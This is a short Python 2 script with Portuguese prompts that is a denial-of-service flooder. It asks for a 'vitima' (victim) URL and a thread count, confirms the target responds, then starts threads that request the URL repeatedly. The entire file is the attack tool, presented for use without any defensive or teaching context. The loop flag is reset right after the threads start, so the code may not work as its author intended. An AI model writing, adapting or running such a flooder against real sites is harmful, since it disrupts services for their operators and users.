# /usr/bin/Python
# -*- coding: utf-8 -*-
import sys
import time
import threading
import urllib

time.sleep(3)

a = 1
b = threading.Lock()


class dos(threading.Thread):
    def __init__(self, host, threads):
        threading.Thread.__init__(self)
        self.host = host
        self.threads = threads

    def run(self):
        global a
        global b
        b.acquire()
        print "\n                           ecosistema -> {0}".format(self.threads)
        b.release()
        while 1 == a:
            try:
                urllib.urlopen(self.host).read
                try:
                    urllib.urlopen(self.host).read
                except:
                    pass
            except:
                pass
        b.acquire()
        print "                          ecosistema {0}\n".format(self.threads)
        b.release()
        sys.exit()


try:
    threads = input("              Potência(100000) : ")
except NameError:
    sys.exit()
while True:
    host = raw_input("\n             vitima  : ")
    print "\n                Ecosistema1533 \n"
    time.sleep(2)
    try:
        urllib.urlopen(host)
    except IOError:
        print "\nEspere um momento\n"
        sys.exit()
    else:
        break
print "\n" * 2500
c = raw_input("                    Deseja iniciar o attack ? ( Y/N ) > ")
if c == "Y":
    pass
elif c == "N":
    print "\n                           Ecosistema.\n"
    sys.exit()
for A in xrange(threads):
    dos(host, A + 1).start()
a = 0
print "                    Ecosistema1533   \n"
